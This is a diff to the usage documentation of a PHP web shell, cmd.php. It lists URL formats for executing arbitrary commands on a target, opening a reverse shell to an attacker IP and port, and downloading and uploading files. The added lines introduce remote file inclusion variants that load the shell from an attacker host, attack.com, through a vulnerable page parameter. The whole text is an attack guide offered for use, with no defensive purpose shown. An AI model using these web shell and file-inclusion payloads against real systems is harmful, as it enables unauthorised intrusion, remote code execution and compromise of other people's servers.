@@ -12,8 +12,8 @@ Execute commands
 To execute a command on the target system, use the following URL format:
 
 ```
-http://target.com/path/cmd.php?cmd=[COMMAND]
-
+LOCAL: http://target.com/path/cmd.php?cmd=[COMMAND]
+REMOTE: http://target.com/index.php?page=http://attack.com/cmd.php&cmd=[COMMAND]
 Replace [COMMAND] with the command you want to execute on the target system.
 ```
 ## Initiate reverse shell
@@ -21,8 +21,8 @@ To initiate a reverse shell to your system, use the following URL format:
 
 ```
 
-http://target.com/path/cmd.php?revshell=[ATTACKER_IP]:[ATTACKER_PORT]
-
+LOCAL: http://target.com/path/cmd.php?revshell=[ATTACKER_IP]:[ATTACKER_PORT]
+REMOTE: http://target.com/index.php?page=http://attack.com/cmd.php&revshell=[ATTACKER_IP]:[ATTACKER_PORT]
 Replace [ATTACKER_IP] with your IP address and [ATTACKER_PORT] with the port you want to use for the reverse shell connection. 
 Make sure to set up a listener on your system to receive the connection.
 ```
@@ -31,8 +31,8 @@ To download a file from a URL and save it on the target system, use the followin
 
 ```
 
-http://target.com/path/cmd.php?download=[URL]&filename=[FILENAME]
-
+LOCAL: http://target.com/path/cmd.php?download=[URL]&filename=[FILENAME]
+REMOTE: http://target.com/index.php?page=http://attack.com/cmd.php&download=[URL]&filename=[FILENAME]
 Replace [URL] with the URL of the file you want to download, 
 and [FILENAME] with the desired name for the saved file on the target system.
 ```
@@ -40,8 +40,8 @@ and [FILENAME] with the desired name for the saved file on the target system.
 To upload a file to the target system, use the following URL format:
 ```
 
-http://target.com/path/cmd.php?upload&filepath=[FILE_PATH]
-
+LOCAL: http://target.com/path/cmd.php?upload&filepath=[FILE_PATH]
+REMOTE: http://target.com/index.php?page=http://attack.com/cmd.php&upload&filepath=[FILE_PATH]
 Replace [FILE_PATH] with the desired file path for the uploaded file on the target system. 
 Use an HTTP POST request to send the file with the Content-Type 
 header set to multipart/form-data and the file parameter named "file".
